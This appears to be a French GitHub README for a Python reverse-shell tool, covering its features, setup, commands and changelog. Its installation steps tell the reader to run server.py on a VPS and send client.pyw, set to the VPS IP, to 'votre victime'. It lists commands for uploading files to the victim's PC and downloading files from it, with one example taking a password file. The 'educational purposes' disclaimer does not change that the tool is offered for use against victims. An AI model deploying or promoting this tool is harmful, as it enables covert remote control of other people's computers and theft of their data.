
<h1 align='center'>Reverse Shell 🧨</h1>

<p align='center'>
  <b>Star ⭐ si vous voulez plus</b><br>
<i>(English README.md <a href="https://github.com/DictateurMiro/reverse-shell/blob/main/English-README.md">here</a>)</i>
</p>

<p align="center">
  <img src="https://img.shields.io/github/languages/top/DictateurMiro/reverse-shell?color=red&style=flat">
  <img src="https://img.shields.io/github/last-commit/DictateurMiro/reverse-shell?color=red&style=flat">
  <img src="https://img.shields.io/github/stars/DictateurMiro/reverse-shell?color=red&style=flat&label=Stars">
  <img src="https://img.shields.io/github/forks/DictateurMiro/reverse-shell?color=red&style=flat&label=Forks">
</p>

---

<h2 align='center'>
Contact :
</h2>

<p align='center'>
<a href="https://t.me/empereurmiro">Telegram</a> 
</p>

---

## 🌙 Caractéristiques
```sh-session
✔ Connexion automatique sur le serveur
✔ Installation de modules automatique côté client
✔ Interface magnifique
✔ Envoyé et Téléchargé des fichiers
```
---

## ✨ Fonctionnement d'un Reverse Shell
<img src="https://raw.githubusercontent.com/DictateurMiro/reverse-shell/main/images/fonctionnement%20reverse%20shell.png">

---

## 🎥 Video
<img src="https://raw.githubusercontent.com/DictateurMiro/reverse-shell/main/images/demo.gif">

---

## 🚀 Installation & Configuration

```sh-session
> Téléchargé le fichier (git clone https://github.com/DictateurMiro/reverse-shell.git)
> Ouvrez le port 13037 sur votre vps
> Lancez server.py
> Envoyez client.pyw (avec l'ip de votre vps dans le fichier) a votre victime
> Fini !
```

---

## 🎉 Upcoming / enhancements

```sh-session
- Fonctionne avec un hôte Linux
```

---

## 🎭 Useful command

```
- echo %cd% ||| Équivalent à 'pwd' sur Unix pour savoir dans quel dossier vous êtes
- cd .. && mkdir reverse ||| '&&' Permet d'exécuter une commande puis une autre, exemple 'cd ..' permet d'aller un dossier en arrière puis de créer un dossier.
- type file.txt ||| Équivalent à 'cat' sur Unix pour voir le contenu d'un fichier texte.
- echo "salut" >> salut.txt ||| Permet d'écrire "salut" dans un fichier qui va être appelé "salut.txt".
- tasklist ||| Permet de voir toutes les proccess en cours avec leur nom et leur PID 
- taskkill /F /PID [PID] ||| Permet de quitter un process via le PID

- upload [Chemin d'accès] ||| Permet d'envoyer un fichier sur le pc de la victime (Exemple: upload C:\Users\Miro\Desktop\token.py)
- download [Chemin d'accès] ||| Permet de récupérer un fichier du pc de la victime (Exemple: download C:\Users\Victime\Documents\motdepasse.txt)
```

---

## 📋 License

Ce projet est placé sous la licence MIT
```js
  ・A des fins éducatives uniquement et toutes les conséquences causées par vos actions sont de votre responsabilité.
  ・La vente de cet outil gratuit est interdite
  ・Si vous faites une copie de ce document ou si vous le mettez en ligne, il doit s'agir d'un logiciel libre et les crédits doivent renvoyer à ce repo
```

---

## 💭 ChangeLog

```diff

v1.3.1 ⋮ 23/10/2023
+ Ajout (des commandes utile) dans README.md ainsi d'une explication de comment les utiliser 

v1.3 ⋮ 21/10/2023
+ Ajout de la commande 'download' Pour directement téléchargé des fichier de la victime sur votre VPS

v1.2 ⋮ 20/10/2023
+ Ajout de la commande 'upload' Pour envoyer des fichiers de votre VPS à votre victime
- Suppresion du module 'keyboard' car il était inutile

v1.1 ⋮ 16/10/2023
+ Ajout d'une video pour expliquer le fonctionnement 
```

<p align="center">
  README inspiré de xKiian
</p>
